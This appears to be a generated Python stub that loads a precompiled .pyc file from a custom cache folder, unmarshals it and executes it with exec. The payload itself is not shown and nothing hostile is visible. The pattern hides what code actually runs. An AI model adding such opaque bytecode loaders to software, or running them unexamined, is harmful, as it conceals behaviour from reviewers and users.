
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_c27e6b5a48cd42c6a0343b2deea76b2d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
